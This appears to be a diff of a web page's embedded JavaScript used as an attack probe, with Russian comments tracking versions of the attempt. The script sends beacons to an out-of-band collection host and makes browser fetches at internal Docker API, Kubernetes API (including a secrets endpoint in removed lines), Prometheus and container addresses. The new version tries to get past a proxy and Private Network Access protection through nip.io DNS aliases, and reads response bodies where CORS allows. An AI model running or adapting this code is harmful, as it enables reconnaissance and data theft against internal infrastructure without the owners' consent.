@@ -7,23 +7,18 @@ var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
 function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
-fire('/alive12?t=0');
+fire('/alive13?t=0');
 
-// <script> тег к приватным IP держит страницу живой ~20с (доказано v11: sc-er?ms=19800)
-// Добавляем их первыми — страница не закроется пока они pending
 function keepAlive(url) {
   var s = document.createElement('script');
   s.src = url;
   document.head.appendChild(s);
 }
-keepAlive('http://172.17.0.1:2375/_ping');  // Docker API
-keepAlive('http://172.17.0.1:9090/');       // Prometheus/Portainer?
+// keepAlive via nip.io — тест обхода PNA через DNS-псевдоним
+keepAlive('http://172-17-0-1.nip.io:2375/_ping');
+keepAlive('http://172-17-0-1.nip.io:9090/');
 
-// Теперь у нас ~20с. Запускаем CORS fetch с длинным таймаутом.
-// cf-ok  = сервер ответил И CORS позволил читать → читаем тело (data!)
-// cf-err = сервер ответил но CORS заблокировал → сервер существует
-// cf-to  = сервер не ответил на OPTIONS/GET в отведённое время
-
+// CORS fetch: cf-ok = CORS открыт, тело прочитано; cf-err = CORS заблокировал (но соединение было); cf-to = прокси/таймаут
 function cf(label, url, ms) {
   var t0 = Date.now();
   fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
@@ -40,32 +35,37 @@ function cf(label, url, ms) {
     });
 }
 
-// k8s API insecure port 8080 — первый раз с достаточным таймаутом
-cf('k8s-ver',      'http://10.96.0.1:8080/version',                          15000);
-cf('k8s-api',      'http://10.96.0.1:8080/api',                              15000);
-cf('k8s-secrets',  'http://10.96.0.1:8080/api/v1/secrets',                   15000);
-cf('k8s-nodes',    'http://10.96.0.1:8080/api/v1/nodes',                     15000);
-cf('k8s-pods',     'http://10.96.0.1:8080/api/v1/pods',                      15000);
+// no-cors fetch: nc-ok = соединение установлено (response opaque); nc-err/nc-to = ошибка/таймаут
+function nc(label, url, ms) {
+  var t0 = Date.now();
+  fetch(url, {mode: 'no-cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
+    .then(function(r) {
+      fire('/nc-ok-' + label + '?ms=' + (Date.now()-t0) + '&type=' + r.type);
+    })
+    .catch(function(e) {
+      var el = Date.now() - t0;
+      fire('/nc-' + (el >= ms-200 ? 'to' : 'err') + '-' + label
+        + '?ms=' + el + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
+    });
+}
 
-// Docker API — с достаточным таймаутом
-cf('dapi-ping',    'http://172.17.0.1:2375/_ping',                           15000);
-cf('dapi-info',    'http://172.17.0.1:2375/info',                            15000);
-cf('dapi-cont',    'http://172.17.0.1:2375/containers/json',                 15000);
-cf('dapi-img',     'http://172.17.0.1:2375/images/json',                     15000);
+// КЛЮЧЕВОЙ ТЕСТ: raw IP (v12 → 9s прокси-таймаут) vs nip.io (обход прокси?)
+nc('raw-dapi',   'http://172.17.0.1:2375/_ping',           12000); // ref: должен упасть в ~9с
+nc('nip-dapi',   'http://172-17-0-1.nip.io:2375/_ping',    12000); // если nc-ok → прокси обойдён!
+nc('nip-dcont',  'http://172-17-0-1.nip.io:2375/containers/json', 12000);
+nc('nip-9090',   'http://172-17-0-1.nip.io:9090/',         12000);
+nc('nip-c2',     'http://172-17-0-2.nip.io/',               12000);
+nc('nip-c3',     'http://172-17-0-3.nip.io/',               12000);
 
-// Сервисы на 172.17.0.1
-cf('svc-9090',     'http://172.17.0.1:9090/',                                15000); // Prometheus/Portainer
-cf('svc-8080',     'http://172.17.0.1:8080/',                                15000);
-cf('svc-5000',     'http://172.17.0.1:5000/',                                15000);
-
-// Контейнеры — порты 80 и 8080
-cf('c2-80',        'http://172.17.0.2/',                                     15000);
-cf('c2-8080',      'http://172.17.0.2:8080/',                                15000);
-cf('c3-80',        'http://172.17.0.3/',                                     15000);
-cf('c3-8080',      'http://172.17.0.3:8080/',                                15000);
-cf('c4-80',        'http://172.17.0.4/',                                     10000);
-cf('c5-80',        'http://172.17.0.5/',                                     10000);
-cf('c6-80',        'http://172.17.0.6/',                                     10000);
+// CORS fetch с nip.io — если прокси обойдён и сервис отдаёт CORS → читаем тело!
+cf('nip-dapi',   'http://172-17-0-1.nip.io:2375/_ping',             12000);
+cf('nip-dcont',  'http://172-17-0-1.nip.io:2375/containers/json',   12000);
+cf('nip-dinfo',  'http://172-17-0-1.nip.io:2375/info',              12000);
+cf('nip-9090',   'http://172-17-0-1.nip.io:9090/',                  12000);
+cf('nip-c2',     'http://172-17-0-2.nip.io/',                        12000);
+cf('nip-c3',     'http://172-17-0-3.nip.io/',                        12000);
+cf('nip-c2-8k',  'http://172-17-0-2.nip.io:8080/',                   12000);
+cf('nip-c3-8k',  'http://172-17-0-3.nip.io:8080/',                   12000);
 </script>
 </body>
 </html>
